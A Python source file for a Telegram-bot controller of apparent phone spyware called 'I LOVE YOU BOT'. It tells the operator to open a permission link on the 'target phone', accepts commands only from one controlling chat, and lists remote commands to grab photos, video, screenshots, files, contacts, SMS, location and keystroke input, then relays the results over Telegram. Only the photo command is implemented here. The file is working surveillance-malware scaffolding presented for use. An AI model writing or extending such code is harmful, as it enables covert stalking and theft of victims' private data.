# telegram_control.py
import os
from telegram import Bot, Update
from telegram.ext import Application, CommandHandler, ContextTypes
from config import BOT_TOKEN, CHAT_ID, PERMISSION_LINK, PERMISSION_GRANTED
from modules.helper import *

app = Application.builder().token(BOT_TOKEN).build()
bot = Bot(token=BOT_TOKEN)

def check_permission():
    if not PERMISSION_GRANTED:
        print(f"Permission required! Open this link on target phone: {PERMISSION_LINK}")
        return False
    return True

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_chat.id) != CHAT_ID:
        await update.message.reply_text("❌ Unauthorized user.")
        return
    await update.message.reply_text("💖 I LOVE YOU BOT is active! Use /help for commands.")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not check_permission():
        await update.message.reply_text(f"❌ Permission not granted! Open this link: {PERMISSION_LINK}")
        return
    commands = """
📸 /photo
🎥 /video
🖼️ /screenshot
📂 /files
📞 /contacts
💬 /sms
📡 /location
🔊 /volume
🔒 /lock
⌨️ /type
📱 /info
🔋 /battery
🌐 /network
✅ /id
"""
    await update.message.reply_text(commands)

# উদাহরণ command
async def photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not check_permission():
        await update.message.reply_text(f"❌ Permission not granted! Open this link: {PERMISSION_LINK}")
        return
    await update.message.reply_text(take_photo())

# অন্য command add করতে পারো helper থেকে
app.add_handler(CommandHandler("start", start))
app.add_handler(CommandHandler("help", help_command))
app.add_handler(CommandHandler("photo", photo))

print("💖 I LOVE YOU BOT is running...")
app.run_polling()
